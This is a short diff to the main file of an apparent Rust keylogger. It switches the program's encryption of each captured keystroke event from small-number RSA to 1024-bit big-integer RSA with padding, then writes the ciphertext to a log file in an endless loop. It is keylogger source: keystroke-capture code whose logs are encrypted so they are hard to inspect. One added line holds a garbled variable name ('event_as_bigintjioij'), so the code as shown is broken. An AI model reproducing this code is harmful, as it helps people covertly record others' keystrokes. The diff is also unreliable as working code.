@@ -2,16 +2,17 @@ mod keylogger;
 mod rsa;
 
 use keylogger::KeyLogger;
-use rsa::{gen_keys, array_mod_pow, convert_to_u64, convert_to_u8};
+use rsa::{gen_keys, pad_data};
 
 use chrono::{DateTime, Local};
+use num_bigint_dig::{ToBigUint, RandBigInt, BigUint};
 use std::path::Path;
 use std::fs::File;
 use std::fs::OpenOptions;
 use std::io::prelude::*;
 
 fn main() {
-	let (e, d, n) = gen_keys(10000, 50000);
+	let (e, d, n) = gen_keys(1024);
 
 	println!("e : {}", e);
 	println!("d : {}", d);
@@ -36,9 +37,10 @@ fn main() {
 
 	loop {
 		let event = &mut test.get_current_event();
-		let event_as_u64 = convert_to_u64(event.to_vec());
-		let cypher = array_mod_pow(event_as_u64, e, n);
-		let buffer = convert_to_u8(cypher);
+		let padded_event = pad_data(event.to_vec(), 1024);
+		let event_as_bigint = BigUint::from_bytes_be(&padded_event);
+		let cypher = event_as_bigintjioij.clone().modpow(&e, &n);
+		let buffer = cypher.clone().to_bytes_be();
 
 		let _ = logs_file.write_all(&buffer);
 	}
